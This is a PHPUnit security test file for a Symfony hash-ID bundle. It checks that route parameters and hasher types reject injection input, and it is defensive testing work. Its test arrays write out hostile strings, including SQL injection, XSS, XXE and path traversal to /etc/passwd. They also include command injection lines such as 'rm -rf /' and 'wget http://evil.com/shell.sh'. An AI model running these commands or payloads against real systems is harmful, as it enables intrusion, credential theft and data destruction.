<?php

declare(strict_types=1);

namespace Pgs\HashIdBundle\Tests\Security;

use PHPUnit\Framework\TestCase;
use Pgs\HashIdBundle\Service\HasherFactory;
use Pgs\HashIdBundle\Attribute\Hash;
use Pgs\HashIdBundle\Service\JsonValidator;
use Pgs\HashIdBundle\AnnotationProvider\AttributeProvider;
use Pgs\HashIdBundle\Exception\InvalidControllerException;
use Pgs\HashIdBundle\ParametersProcessor\Converter\HashidsConverter;
use Hashids\Hashids;

/**
 * Comprehensive input sanitization and parameter validation tests.
 *
 * @covers \Pgs\HashIdBundle\Service\HasherFactory
 * @covers \Pgs\HashIdBundle\Attribute\Hash
 * @covers \Pgs\HashIdBundle\Service\JsonValidator
 * @covers \Pgs\HashIdBundle\AnnotationProvider\AttributeProvider
 * @group security
 */
class InputValidationTest extends TestCase
{
    /**
     * Test SQL injection attempts in parameters.
     */
    public function testSqlInjectionPrevention(): void
    {
        $hasher = new Hashids('test-salt', 10);
        $converter = new HashidsConverter($hasher);

        $sqlInjectionAttempts = [
            "1' OR '1'='1",
            "1; DROP TABLE users; --",
            "1' UNION SELECT * FROM users --",
            "1 AND 1=1",
            "1' AND '1'='1",
            "'; EXEC xp_cmdshell('dir'); --",
            "1' OR 1=1 --",
            "admin'--",
            "' OR 'x'='x",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
        ];

        foreach ($sqlInjectionAttempts as $attempt) {
            // Converter should not process SQL injection attempts as valid IDs
            $decoded = $converter->decode($attempt);

            // Should either return the original string or fail to decode
            $this->assertThat(
                $decoded,
                $this->logicalOr(
                    $this->equalTo($attempt),
                    $this->isEmpty()
                ),
                "SQL injection attempt should not be processed as valid ID: $attempt"
            );

            // Encoding non-numeric values should not work
            if (!is_numeric($attempt)) {
                // Hashids only encodes integers
                $encoded = $converter->encode($attempt);
                $this->assertEmpty(
                    $encoded,
                    "Non-numeric SQL injection should not encode: $attempt"
                );
            }
        }
    }

    /**
     * Test XSS prevention in route parameters.
     */
    public function testXssPrevention(): void
    {
        $xssAttempts = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',
            '${alert(1)}',
            '<script>document.cookie</script>',
            'onclick=alert(1)//',
        ];

        // Test Hash attribute validation
        foreach ($xssAttempts as $attempt) {
            try {
                new Hash($attempt);
                $this->fail("XSS attempt should be rejected: $attempt");
            } catch (\InvalidArgumentException $e) {
                $this->assertStringContainsString(
                    'Invalid parameter name',
                    $e->getMessage(),
                    "XSS attempt should be caught as invalid parameter"
                );
            }
        }

        // Test parameter processing
        $hasher = new Hashids('test-salt', 10);
        $converter = new HashidsConverter($hasher);

        foreach ($xssAttempts as $attempt) {
            $decoded = $converter->decode($attempt);

            // Should not process as valid hash
            $this->assertThat(
                $decoded,
                $this->logicalOr(
                    $this->equalTo($attempt),
                    $this->isEmpty()
                ),
                "XSS attempt should not be processed as valid hash: $attempt"
            );
        }
    }

    /**
     * Test path traversal protection.
     */
    public function testPathTraversalProtection(): void
    {
        $pathTraversalAttempts = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            'file:///etc/passwd',
            '....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..;/etc/passwd',
            '../.\\../.\\etc/passwd',
            'C:\\..\\..\\windows\\system32',
            '/var/www/../../etc/passwd',
            '\\\\server\\share\\..\\..\\sensitive',
        ];

        // Test parameter name validation
        foreach ($pathTraversalAttempts as $attempt) {
            try {
                new Hash($attempt);
                $this->fail("Path traversal attempt should be rejected: $attempt");
            } catch (\InvalidArgumentException $e) {
                $this->assertThat(
                    $e->getMessage(),
                    $this->logicalOr(
                        $this->stringContains('Invalid parameter name'),
                        $this->stringContains('too long')
                    ),
                    "Path traversal should be caught"
                );
            }
        }

        // Test controller path validation
        $compatibilityLayer = $this->createMock(\Pgs\HashIdBundle\Service\CompatibilityLayer::class);
        $reflectionProvider = $this->createMock(\Pgs\HashIdBundle\Reflection\ReflectionProvider::class);
        $provider = new AttributeProvider($compatibilityLayer, $reflectionProvider);

        foreach ($pathTraversalAttempts as $attempt) {
            try {
                $provider->getFromString($attempt . '::method', 'Hash');
                $this->fail("Path traversal in controller should be rejected: $attempt");
            } catch (InvalidControllerException $e) {
                $this->assertStringContainsString(
                    'Invalid controller format',
                    $e->getMessage()
                );
            }
        }
    }

    /**
     * Test buffer overflow prevention with large inputs.
     */
    public function testBufferOverflowPrevention(): void
    {
        // Test extremely long parameter names
        $longStrings = [
            str_repeat('a', 1000),     // 1KB
            str_repeat('x', 10000),    // 10KB
            str_repeat('0', 100000),   // 100KB
            str_repeat('A', 1000000),  // 1MB
        ];

        foreach ($longStrings as $longString) {
            // Test Hash attribute validation
            try {
                new Hash($longString);
                $this->fail('Long parameter name should be rejected');
            } catch (\InvalidArgumentException $e) {
                $this->assertStringContainsString(
                    'too long',
                    $e->getMessage(),
                    'Buffer overflow should be prevented'
                );
            }

            // Test JSON validation
            $validator = new JsonValidator();
            $largeJson = json_encode(['param' => $longString]);

            if (strlen($largeJson) > 10485760) { // 10MB limit
                $this->assertFalse(
                    $validator->isValid($largeJson),
                    'Large JSON should be rejected'
                );
            }
        }

        // Test array parameter count limits
        $manyParams = array_map(fn($i) => "param$i", range(1, 1000));

        try {
            new Hash($manyParams);
            $this->fail('Too many parameters should be rejected');
        } catch (\InvalidArgumentException $e) {
            $this->assertStringContainsString(
                'Too many parameters',
                $e->getMessage()
            );
        }
    }

    /**
     * Test command injection prevention.
     */
    public function testCommandInjectionPrevention(): void
    {
        $commandInjectionAttempts = [
            '$(whoami)',
            '`id`',
            '; ls -la',
            '| cat /etc/passwd',
            '&& rm -rf /',
            '|| wget http://evil.com/shell.sh',
            '$(curl http://evil.com)',
            '\'; system("ls"); //',
            '"; exec("cmd.exe"); //',
            '${IFS}cat${IFS}/etc/passwd',
        ];

        foreach ($commandInjectionAttempts as $attempt) {
            // Test parameter validation
            try {
                new Hash($attempt);
                $this->fail("Command injection attempt should be rejected: $attempt");
            } catch (\InvalidArgumentException $e) {
                $this->assertStringContainsString(
                    'Invalid parameter name',
                    $e->getMessage()
                );
            }

            // Test HasherFactory type validation
            $factory = new HasherFactory();
            try {
                $factory->create($attempt);
                $this->fail("Command injection in hasher type should be rejected");
            } catch (\InvalidArgumentException $e) {
                $this->assertStringContainsString(
                    'Unknown hasher type',
                    $e->getMessage()
                );
            }
        }
    }

    /**
     * Test null byte injection prevention.
     */
    public function testNullByteInjectionPrevention(): void
    {
        $nullByteAttempts = [
            "param\x00",
            "param\0.txt",
            "param%00",
            "param\x00.php",
            "file.txt\x00.jpg",
        ];

        foreach ($nullByteAttempts as $attempt) {
            // Test parameter validation
            try {
                new Hash($attempt);
                $this->fail("Null byte injection should be rejected: $attempt");
            } catch (\InvalidArgumentException $e) {
                $this->assertStringContainsString(
                    'Invalid parameter name',
                    $e->getMessage()
                );
            }

            // Test controller validation
            $compatibilityLayer = $this->createMock(\Pgs\HashIdBundle\Service\CompatibilityLayer::class);
            $reflectionProvider = $this->createMock(\Pgs\HashIdBundle\Reflection\ReflectionProvider::class);
            $provider = new AttributeProvider($compatibilityLayer, $reflectionProvider);

            try {
                $provider->getFromString("Controller\x00::method", 'Hash');
                $this->fail("Null byte in controller should be rejected");
            } catch (InvalidControllerException $e) {
                $this->assertTrue(true, "Null byte prevented");
            }
        }
    }

    /**
     * Test Unicode and encoding attack prevention.
     */
    public function testUnicodeEncodingAttackPrevention(): void
    {
        $unicodeAttempts = [
            "\u{202E}drowssap",  // Right-to-left override
            "param\u{200B}",      // Zero-width space
            "\u{FEFF}param",      // Zero-width no-break space
            "pa\u{0000}ram",      // Null character
            "\u{206A}param",      // Inhibit symmetric swapping
        ];

        foreach ($unicodeAttempts as $attempt) {
            // Most of these should be caught by parameter validation
            try {
                $hash = new Hash($attempt);
                // If it doesn't throw, verify it's sanitized
                $params = $hash->getParameters();
                foreach ($params as $param) {
                    // Should not contain control characters
                    $this->assertMatchesRegularExpression(
                        '/^[a-zA-Z0-9_]+$/',
                        $param,
                        'Parameters should be sanitized'
                    );
                }
            } catch (\InvalidArgumentException $e) {
                $this->assertTrue(true, "Unicode attack prevented");
            }
        }
    }

    /**
     * Test LDAP injection prevention.
     */
    public function testLdapInjectionPrevention(): void
    {
        $ldapInjectionAttempts = [
            '*)(uid=*',
            'admin)(|(password=*',
            '*)(objectClass=*',
            'admin)(uid=*))(|(uid=*',
            '*)(mail=*@*',
        ];

        foreach ($ldapInjectionAttempts as $attempt) {
            try {
                new Hash($attempt);
                $this->fail("LDAP injection attempt should be rejected: $attempt");
            } catch (\InvalidArgumentException $e) {
                $this->assertStringContainsString(
                    'Invalid parameter name',
                    $e->getMessage()
                );
            }
        }
    }

    /**
     * Test XML/XXE injection prevention.
     */
    public function testXmlXxeInjectionPrevention(): void
    {
        $xmlAttempts = [
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            '<?xml version="1.0"?><!DOCTYPE foo><foo>&xxe;</foo>',
            '<![CDATA[<script>alert(1)</script>]]>',
        ];

        $validator = new JsonValidator();

        foreach ($xmlAttempts as $attempt) {
            // JSON validator should reject XML
            $this->assertFalse(
                $validator->isValid($attempt),
                "XML content should not validate as JSON"
            );

            // Parameter validation should reject XML tags
            if (strpos($attempt, '<') !== false) {
                try {
                    new Hash($attempt);
                    $this->fail("XML content should be rejected as parameter");
                } catch (\InvalidArgumentException $e) {
                    $this->assertTrue(true, "XML injection prevented");
                }
            }
        }
    }

    /**
     * Test integer overflow prevention.
     */
    public function testIntegerOverflowPrevention(): void
    {
        $hasher = new Hashids('test-salt', 10);
        $converter = new HashidsConverter($hasher);

        $overflowValues = [
            PHP_INT_MAX,
            PHP_INT_MAX + 1,
            -PHP_INT_MAX,
            '999999999999999999999999999999',
            '0x7FFFFFFFFFFFFFFF',
        ];

        foreach ($overflowValues as $value) {
            // Hashids only works with positive integers within PHP_INT_MAX
            if (is_numeric($value)) {
                $intValue = is_float($value) ? (int)$value : $value;

                if ($intValue > 0 && $intValue < PHP_INT_MAX) {
                    // Valid range should work
                    $encoded = $converter->encode($intValue);
                    $this->assertNotEmpty(
                        $encoded,
                        "Should encode valid integer: $intValue"
                    );

                    $decoded = $converter->decode($encoded);
                    $this->assertEquals($intValue, $decoded);
                } else {
                    // Out of range - Hashids doesn't support negative or overflow values
                    // This is expected behavior for security
                    $this->assertTrue(
                        true,
                        "Out of range values are not supported by Hashids (security feature)"
                    );
                }
            } else {
                // Non-numeric strings should not encode
                $encoded = $converter->encode($value);
                $this->assertEmpty(
                    $encoded,
                    "Non-numeric value should not encode: $value"
                );
            }
        }
    }

    /**
     * Test format string attack prevention.
     */
    public function testFormatStringAttackPrevention(): void
    {
        $formatStringAttempts = [
            '%s%s%s%s%s',
            '%x%x%x%x',
            '%d' . str_repeat('%x', 100),
            '%n%n%n',
            '%%%%%%%%%%s',
        ];

        foreach ($formatStringAttempts as $attempt) {
            // Parameter validation
            try {
                new Hash($attempt);
                $this->fail("Format string should be rejected: $attempt");
            } catch (\InvalidArgumentException $e) {
                $this->assertStringContainsString(
                    'Invalid parameter name',
                    $e->getMessage()
                );
            }

            // Hasher type validation
            $factory = new HasherFactory();
            try {
                $factory->create($attempt);
                $this->fail("Format string in hasher type should be rejected");
            } catch (\InvalidArgumentException $e) {
                $this->assertTrue(true, "Format string prevented");
            }
        }
    }

    /**
     * Test regex injection prevention.
     */
    public function testRegexInjectionPrevention(): void
    {
        $regexAttempts = [
            '(.*)',
            '.*',
            '[a-z]*',
            '^.*$',
            '(?i)password',
            '\\w+',
            '.+',
            '(a+)+$',  // ReDoS pattern
        ];

        foreach ($regexAttempts as $attempt) {
            // Parameter validation should reject regex patterns
            try {
                $hash = new Hash($attempt);
                // If accepted, should be treated as literal
                $params = $hash->getParameters();
                $this->assertEquals([$attempt], $params);
            } catch (\InvalidArgumentException $e) {
                $this->assertStringContainsString(
                    'Invalid parameter name',
                    $e->getMessage()
                );
            }
        }
    }
}